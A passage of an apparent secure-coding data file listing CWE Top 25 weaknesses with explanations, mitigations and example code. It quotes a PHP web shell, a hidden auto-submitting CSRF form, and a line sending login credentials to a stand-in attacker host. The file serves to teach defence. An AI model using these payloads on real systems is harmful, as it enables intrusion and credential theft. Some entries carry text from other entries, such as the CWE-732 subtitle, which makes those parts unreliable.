        When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

        For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.

        Architecture and Design
        Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before you allow .html or .htm file types.
        Implementation
        Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that "filename.php.gif" is fed to the PHP interpreter.
        Implementation
        When running on a web server that supports case-insensitive filenames, ensure that you perform case-insensitive
        evaluations of the extensions that are provided.`,

    example: `The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type "file".

        (good code)
        Example Language: HTML
        <form action="upload_picture.php" method="post" enctype="multipart/form-data">

        Choose a file to upload:
        <input type="file" name="filename"/>
        <br/>
        <input type="submit" name="submit" value="Submit"/>

        </form>
        Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory.

        (bad code)
        Example Language: PHP

        // Define the target location where the picture being

        // uploaded is going to be saved.
        $target = "pictures/" . basename($_FILES['uploadedfile']['name']);

        // Move the uploaded file to the new location.
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))
        {
        echo "The picture has been successfully uploaded.";
        }
        else
        {
        echo "There was an error uploading the picture, please try again.";
        }
        The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name:

        (attack code)

        malicious.php
        Since this filename ends in ".php" it can be executed by the web server. In the contents of this uploaded file, the attacker could use:

        (attack code)
        Example Language: PHP
        <?php
        system($_GET['cmd']);

        ?>
        Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as:

        (attack code)

        http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l
        which runs the "ls -l" command - or any other type of command that the attacker wants to specify.`,

  },
  {
    title: '[10] CWE-807: Reliance on Untrusted Inputs in a Security Decision',
    subtitle: `The application uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.
        `,
    isVulnerablePara: `Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.

        Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.`,
    prevention: `Phase: Architecture and Design

        Strategy: Attack Surface Reduction

        Store state information and sensitive data on the server side only.
        Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.
        If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).
        Phase: Architecture and Design

        Strategy: Libraries or Frameworks

        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        With a stateless protocol such as HTTP, use a framework that maintains the state for you.
        Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].
        Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.
        Phase: Architecture and Design

        For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
        Phases: Operation; Implementation

        Strategy: Environment Hardening

        When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
        Phases: Architecture and Design; Implementation

        Strategy: Attack Surface Reduction

        Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
        Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.`,

    example: `In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.

        (bad code)
        Example Language: Java
        Cookie[] cookies = request.getCookies();
        for (int i =0; i< cookies.length; i++) {
        Cookie c = cookies[i];
        if (c.getName().equals("authenticated") && Boolean.TRUE.equals(c.getValue())) {
        authenticated = true;
        }
        }`,

  },
  {
    title: '[11] CWE-250: Execution with Unnecessary Privileges',
    subtitle: `The software performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.
        `,
    isVulnerablePara: `New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges.

        Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or
        sub-process will operate with root privileges.`,
    prevention: `Phases: Architecture and Design; Operation

        Strategy: Environment Hardening

        Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
        Phase: Architecture and Design

        Strategy: Separation of Privilege

        Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.
        Phase: Architecture and Design

        Strategy: Attack Surface Reduction

        Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.
        Phase: Implementation

        Perform extensive input validation for any privileged code that must be exposed to the user and reject anything that does not fit your strict requirements.
        Phase: Implementation

        When dropping privileges, ensure that they have been dropped successfully to avoid CWE-273. As protection mechanisms in the environment get stronger,
        privilege-dropping calls may fail even if it seems like they would always succeed.`,

    example: `This application intends to use a user's location to determine the timezone the user is in:

        (bad code)
        Example Language: Java
        locationClient = new LocationClient(this, this, this);
        locationClient.connect();
        Location userCurrLocation;
        userCurrLocation = locationClient.getLastLocation();
        setTimeZone(userCurrLocation);
        This is unnecessary use of the location API, as this information is already available using the Android Time API. Always be sure there is not another way to obtain needed information before resorting to using the location API.`,

  },
  {
    title: '[12] CWE-352: Cross-Site Request Forgery (CSRF)',
    subtitle: `The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.
        `,
    isVulnerablePara: `When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.
        `,
    prevention: `Access control is only effective if enforced in trusted server
      side
      code or server less API, where the attacker cannot modify the
      access control check or metadata.
      •
      With the exception of public resources, deny by default.
      •
      Implement access control mechanisms once and re use them
      throughout the application, including minimizing CORS usage.
      •
      Model access controls should enforce record ownership, rather
      than accepting that the user can create, read, update, or delete
      any record.
      •
      Unique application business limit requirements should be
      enforced by domain models.
      •
      Disable web server directory listing and ensure file metadata
      (e.g. .git) and backup files are not present within web
      •
      Log access control failures, alert admins when appropriate
      (e.g. repeated
      •
      Rate limit API and controller access to minimize the harm from
      automated attack tooling.
      •
      JWT tokens should be invalidated on the server after logout.
      Developers and QA staff should include functional access control
      unit and integration tests.`,

    example: `This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.

        The following HTML is intended to allow a user to update a profile.

        (bad code)
        Example Language: HTML
        <form action="/url/profile.php" method="post">
        <input type="text" name="firstname"/>
        <input type="text" name="lastname"/>
        <br/>
        <input type="text" name="email"/>
        <input type="submit" name="submit" value="Update"/>
        </form>
        profile.php contains the following code.

        (bad code)
        Example Language: PHP
        // initiate the session in order to validate sessions

        session_start();

        //if the session is registered to a valid user then allow update

        if (! session_is_registered("username")) {

        echo "invalid session detected!";

        // Redirect user to login page
        [...]

        exit;
        }

        // The user session is valid, so process the request

        // and update the information

        update_profile();

        function update_profile {

        // read in the data from $POST and send an update

        // to the database
        SendUpdateToDatabase($_SESSION['username'], $_POST['email']);
        [...]
        echo "Your profile has been successfully updated.";
        }
        This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.

        The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:

        (attack code)
        Example Language: HTML
        <SCRIPT>
        function SendAttack () {
        form.email = "attacker@example.com";
        // send to profile.php
        form.submit();
        }
        </SCRIPT>

        <BODY onload="javascript:SendAttack();">

        <form action="http://victim.example.com/profile.php" id="form" method="post">
        <input type="hidden" name="firstname" value="Funny">
        <input type="hidden" name="lastname" value="Joke">
        <br/>
        <input type="hidden" name="email">
        </form>
        Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.

        Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.

        + Observed Examples`,

  },
  {
    title: '[13] CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)',
    subtitle: `The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.
        `,
    isVulnerablePara: `Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.

        In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.`,
    prevention: `Phase: Architecture and Design

        For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
        Phase: Implementation

        Strategy: Input Validation

        Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
        Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:
        realpath() in C
        getCanonicalPath() in Java
        GetFullPath() in ASP.NET
        realpath() or abs_path() in Perl
        realpath() in PHP
        Phase: Architecture and Design

        Strategy: Libraries or Frameworks

        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Phase: Operation

        Strategy: Firewall

        Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
        Effectiveness: Moderate

        Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally,
         some manual effort may be required for customization.`,

    example: `In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.

        (bad code)
        Example Language: Java
        String filename = System.getProperty("com.domain.application.dictionaryFile");
        File dictionaryFile = new File(filename);
        However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of
        application or user home directory.`,

  },
  {
    title: '[14] CWE-494: Download of Code Without Integrity Check',
    subtitle: `The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.
        `,
    isVulnerablePara: `You don't need to be a guru to realize that if you download code and execute it, you're trusting that the source of that code isn't malicious. Maybe you only access a download site that you trust, but attackers can perform all sorts of tricks to modify that code before it reaches you. They can hack the download site, impersonate it with DNS spoofing or cache poisoning, convince the system to redirect to a different site, or even modify the code in transit as it crosses the network. This scenario even applies to cases in which your own product downloads and installs its own updates. When this happens, your software will wind up running code that it doesn't expect, which is bad for you but great for attackers.

        `,
    prevention: `Implementation
        Perform proper forward and reverse DNS lookups to detect DNS spoofing.
        Notes: This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit.

        Architecture and Design, Operation
        Encrypt the code with a reliable encryption scheme before transmitting.
        This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.

        Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.

        If you are providing the code that is to be downloaded, such as for automatic updates of your software, then use cryptographic signatures for your code and modify your download clients to verify the signatures. Ensure that your implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.

        Use code signing technologies such as Authenticode. See references.

        Architecture and Design, Operation
        Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
        Architecture and Design, Operation
        Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.
        OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.

        This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.

        Be careful to avoid CWE-243 and other weaknesses related to jails.

        Effectiveness: Limited

        Notes: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.`,

    example: `This example loads an external class from a local subdirectory.

        (bad code)
        Example Language: Java
        URL[] classURLs= new URL[]{
        new URL("file:subdir/")
        };
        URLClassLoader loader = new URLClassLoader(classURLs);
        Class loadedClass = Class.forName("loadMe", true, loader);
        This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class
        file to execute malicious code.`,

  },
  {
    title: '[15] CWE-863: Incorrect Authorization',
    subtitle: `The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check.
        This allows attackers to bypass intended access restrictions.        `,
    isVulnerablePara: `Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.

        When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures,
         denial of service, and arbitrary code execution.`,
    prevention: `Architecture and Design
        Divide your application into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.
        Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.

        Architecture and Design
        Ensure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor.
        Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        For example, consider using authorization frameworks such as the JAAS Authorization Framework and the OWASP ESAPI Access Control feature.

        Architecture and Design
        For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.
        One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.

        System Configuration, Installation
        Use the access control capabilities of your operating system and server environment and define your access control lists accordingly.
        Use a "default deny" policy when defining these ACLs.`,

    example: `The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.

        (bad code)
        Example Language: PHP
        $role = $_COOKIES['role'];
        if (!$role) {
        $role = getRole('user');
        if ($role) {
        // save the cookie to send out in future responses
        setcookie("role", $role, time()+60*60*2);
        }
        else{
        ShowLoginScreen();
        die("\n");
        }
        }
        if ($role == 'Reader') {
        DisplayMedicalHistory($_POST['patient_ID']);
        }
        else{
        die("You are not Authorized to view this record\n");
        }
        The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the "role" cookie to the value "Reader". As a result, the $role variable is "Reader", and getRole() is never invoked.
        The attacker has bypassed the authorization system.`,

  },
  {
    title: '[16] CWE-829: Inclusion of Functionality from Untrusted Control Sphere',
    subtitle: `The software imports, requires, or includes executable functionality (such as a library)
        from a source that is outside of the intended control sphere.`,
    isVulnerablePara: `When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.

        This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies,
         or open redirect to malware (CWE-601).`,
    prevention: `Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Architecture and Design
        When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
        For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap provide this capability.

        Architecture and Design
        For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
        Architecture and Design, Operation
        Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.
        OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.

        This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.

        Be careful to avoid CWE-243 and other weaknesses related to jails.

        Effectiveness: Limited

        Notes: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.

        Architecture and Design, Operation
        Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator,
         especially in day-to-day operations.`,

    example: `This login webpage includes a weather widget from an external website:

        (bad code)
        Example Language: HTML
        <div class="header"> Welcome!
        <div id="loginBox">Please Login:
        <form id ="loginForm" name="loginForm" action="login.php" method="post">
        Username: <input type="text" name="username" />
        <br/>
        Password: <input type="password" name="password" />
        <input type="submit" value="Login" />
        </form>
        </div>
        <div id="WeatherWidget">
        <script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"></script>
        </div>
        </div>
        This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).

        For example, user login information could easily be stolen with a single line added to weatherwidget.js:

        (attack code)
        Example Language: JavaScript

        ...Weather widget code....
        document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";
        This line of javascript changes the login form's original action target from the original website to an attack site. As a result,
        if a user attempts to login their username and password will be sent directly to the attack site.`,

  },
  {
    title: '[17] CWE-732: Incorrect Permission Assignment for Critical Resource',
    subtitle: `Rather than directly attacking crypto,
      attackers steal keys, execute man in
      the middle attacks, or steal clear text
      data off the server, while in transit, or
      from the user’s client, e.g. browser. A
      manual attack is generally required.
      Previously retrieved password
      databases could be brute forced by
      Graphics Processing Units (GPUs).`,
    isVulnerablePara: `It's rude to take something without asking permission first, but impolite users (i.e., attackers) are willing to spend a little time to see what they can get away with. If you have critical programs, data stores, or configuration files with permissions that make your resources readable or writable by the world - well, that's just what they'll become. While this issue might not be considered during implementation or design, sometimes that's where the solution needs to be applied. Leaving it up to a harried sysadmin to notice and make the appropriate changes is far from optimal, and sometimes impossible.

        `,
    prevention: `Implementation
        When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user), and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party.
        Architecture and Design
        Divide your application into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources.
        Effectiveness: Moderate

        Notes: This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly.

        Architecture and Design, Operation
        Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.
        OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.

        This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.

        Be careful to avoid CWE-243 and other weaknesses related to jails.

        Effectiveness: Moderate

        Notes: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.

        Implementation, Installation
        During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.
        Effectiveness: High

        System Configuration
        For all configuration files, executables, and libraries, make sure that they are only readable and writable by the software's administrator.
        Effectiveness: High

        Documentation
        Do not suggest insecure configuration changes in your documentation, especially if those configurations can extend to resources and other software that are outside the scope of your own software.
        Installation
        Do not assume that the system administrator will manually change the configuration to the settings that you recommend in the manual.
        Operation, System Configuration
        Ensure that your software runs properly under the Federal Desktop Core Configuration (FDCC)
         or an equivalent hardening configuration guide, which many organizations use to limit the attack surface
         and potential risk of deployed software.`,

    example: `The following command recursively sets world-readable permissions for a directory and all of its children:

        (bad code)
        Example Language: Shell
        chmod -R ugo+r DIRNAME
        If this command is run from a program, the person calling the program might not expect that all the files under the directory will be world-readable. If the directory is expected to contain private data,
        this could become a security problem.`,

  },
  {
    title: '[18] CWE-676: Use of Potentially Dangerous Function',
    subtitle: `The program invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.
        `,
    isVulnerablePara: `Safety is critical when handling power tools. The programmer's toolbox is chock full of power tools, including library or API functions that make assumptions about how they will be used, with no guarantees of safety if they are abused. If potentially-dangerous functions are not used properly, then things can get real messy real quick.

        `,
    prevention: `Build and Compilation, Implementation
        Identify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the "banned.h" include file from Microsoft's SDL.`,

    example: `The following code attempts to create a local copy of a buffer to perform some manipulations to the data.

        (bad code)
        Example Language: C
        void manipulate_string(char * string){
        char buf[24];
        strcpy(buf, string);
        ...
        }
        However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and blindly copies `,

  },
  {
    title: '[19] CWE-327: Use of a Broken or Risky Cryptographic Algorithm ',
    subtitle: `The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information.
        `,
    isVulnerablePara: `If you are handling sensitive data or you need to protect a communication channel, you may be using cryptography to prevent attackers from reading it. You may be tempted to develop your own encryption scheme in the hopes of making it difficult for attackers to crack. This kind of grow-your-own cryptography is a welcome sight to attackers. Cryptography is just plain hard. If brilliant mathematicians and computer scientists worldwide can't get it right (and they're always breaking their own stuff), then neither can you. You might think you created a brand-new algorithm that nobody will figure out, but it's more likely that you're reinventing a wheel that falls off just before the parade is about to start.

        `,
    prevention: `Architecture and Design
        Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.
        For example, US government systems require FIPS 140-2 certification.

        Do not develop your own cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If your algorithm can be compromised if attackers find out how it works, then it is especially weak.

        Periodically ensure that you aren't using obsolete cryptography. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong.

        Architecture and Design
        Design your software so that you can replace one cryptographic algorithm with another. This will make it easier to upgrade to stronger algorithms.
        Architecture and Design
        Carefully manage and protect cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant.
        Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Industry-standard implementations will save you development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature.

        Implementation, Architecture and Design
        When you use industry-approved techniques, you need to use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.`,

    example: `These code examples use the Data Encryption Standard (DES).

        (bad code)
        Example Language: C
        EVP_des_ecb();
        (bad code)
        Example Language: Java
        Cipher des=Cipher.getInstance("DES...");
        des.initEncrypt(key2);
        (bad code)
        Example Language: PHP
        function encryptPassword($password){
        $iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $key = "This is a password encryption key";
        $encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);
        return $encryptedPassword;
        }
        Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES).`,

  },
  {
    title: '[20] CWE-131: Incorrect Calculation of Buffer Size',
    subtitle: `The software does not correctly calculate the size to be used when allocating a buffer,
        which could lead to a buffer overflow.        `,
    isVulnerablePara: `In languages such as C, where memory management is the programmer's responsibility, there are many opportunities for error. If the programmer does not properly calculate the size of a buffer, then the buffer may be too small to contain the data that the programmer plans to write - even if the input was properly validated. Any number of problems could produce the incorrect calculation, but when all is said and done, you're going to run head-first into the dreaded buffer overflow.

        `,
    prevention: `Implementation
        If you allocate a buffer for the purpose of transforming, converting, or encoding an input, make sure that you allocate enough memory to handle the largest possible encoding. For example, in a routine that converts "&" characters to "&amp;" for HTML entity encoding, you will need an output buffer that is at least 5 times as large as the input buffer.
        Implementation
        Understand your programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, "not-a-number" calculations, and how your language handles numbers that are too large or too small for its underlying representation.
        Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.

        Implementation
        Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.
        Architecture and Design
        For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
        Implementation
        When processing structured incoming data containing a size field followed by raw data, ensure that you identify and resolve any inconsistencies between the size field and the actual size of the data (CWE-130).
        Implementation
        When allocating memory that uses sentinels to mark the end of a data structure - such as NUL bytes in strings - make sure you also include the sentinel in your calculation of the total amount of memory that must be allocated.
        Implementation
        Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.
        Effectiveness: Moderate

        Notes: This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).

        Additionally, this only addresses potential overflow issues. Resource consumption / exhaustion issues are still possible.`,

    example: `The following image processing code allocates a table for images.

        (bad code)
        Example Language: C
        img_t table_ptr; /*struct containing img data, 10kB each*/
        int num_imgs;
        ...
        num_imgs = get_num_imgs();
        table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);
        ...
